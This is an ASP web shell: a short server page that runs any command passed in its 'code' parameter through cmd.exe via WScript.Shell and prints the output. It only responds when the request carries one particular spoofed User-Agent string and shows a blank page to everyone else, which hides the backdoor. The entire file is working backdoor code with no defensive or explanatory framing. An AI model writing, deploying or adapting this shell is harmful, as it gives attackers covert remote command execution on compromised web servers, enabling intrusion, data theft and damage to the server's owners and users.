<% Dim userAgent
userAgent = Request.ServerVariables("HTTP_USER_AGENT")
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
Dim objShell, objCmdExec
Set objShell = CreateObject("WScript.Shell")
Set objCmdExec = objshell.exec(thecommand)
getCommandOutput = objCmdExec.StdOut.ReadAll
end Function %>

<HTML><BODY><pre>
<% If userAgent = "Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0" Then
    code = Request("code")
    output = getCommandOutput("cmd /c " & code)
    Response.Write(output)
Else
    Response.Write("")
End If %>
</pre></BODY></HTML>
